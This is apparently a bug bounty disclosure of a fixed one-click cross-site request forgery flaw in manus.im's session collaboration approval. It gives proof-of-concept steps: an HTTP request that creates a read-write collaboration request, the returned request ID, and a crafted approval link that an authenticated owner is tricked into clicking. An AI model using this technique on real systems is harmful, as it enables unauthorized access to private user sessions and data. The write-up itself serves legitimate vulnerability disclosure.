---
title: One-Click CSRF for Unauthorized Session Collaboration Approval on manus.im
description: The issue flaw in the session approval workflow allows attackers to bypass cross-site protections and force authenticated session owners into granting unauthorized READ_WRITE access to private AI sessions through a single malicious link.
date: 2026-06-15
categories: [Meta bug bounty]
tags: [Manus.im]
pin: false
math: true
mermaid: true
---

### Description
During a security assessment of manus.im, I discovered that the collaboration approval workflow was vulnerable to Cross-Site Request Forgery (CSRF). An attacker could force a session owner to grant them READ_WRITE access to private AI sessions simply by convincing the victim to click a specially crafted link. This bypasses the need for an explicit user confirmation, leading to potential sensitive data leakage.
The application handles session collaboration requests via a predictable GET endpoint. When an attacker initiates a collaboration request, the backend generates a requestId. The subsequent approval mechanism relies solely on this requestId and sessionId passed as URL parameters.
Crucially, the application failed to validate an Anti-CSRF token or perform any secondary authorization check (such as a POST request with a CSRF header) before executing the state-changing operation.

**Impact:** 

* Unauthorized Access: Attackers gain full READ_WRITE permissions to private sessions.
* Data Exfiltration: Exposure of proprietary prompts, API configurations, and sensitive AI-generated outputs.
* Persistence: Once access is granted, the attacker can continue to monitor the session long after the initial click.

---

## Proof of Concept (Repro Steps)

### Step 1: Initiate Malicious Request
The attacker sends a collaboration request to the target session UID:

#### Request
```http
POST /session.v1.SessionCollaborateService/MemberRequest HTTP/2
Host: api.manus.im
Authorization: Bearer [ATTACKER_JWT]

{
  "sessionUid": "ZbvYYgqJIEs1kR0lxsi9qz",
  "permission": "COLLABORATOR_PERMISSION_READ_WRITE",
  "message": "View my project?"
}
```

### Step 2: Extract Request ID
The server returns a JSON response containing the unique identifier for the request:
```json
{"requestId": "NT2CUAk6pijzMeyf9KBVpG"}
```

### Step 3: Craft the Payload

The attacker constructs a link targeting the victim (the session owner). When the victim clicks this link while authenticated, the browser automatically sends the session cookies to the server, and the action is processed:

```
https://manus.im/collaborate-access?type=approve&sessionId=ZbvYYgqJIEs1kR0lxsi9qz&requestId=NT2CUAk6pijzMeyf9KBVpG](https://manus.im/collaborate-access?type=approve&sessionId=ZbvYYgqJIEs1kR0lxsi9qz&requestId=NT2CUAk6pijzMeyf9KBVpG)
```
---

## Timeline

- **Reported:** Feburay 4, 2026 
- **Triaged:** Feburay 16, 2026 
- **Fixed:** April 18, 2026  
- **Reward:** April 24 2026

---
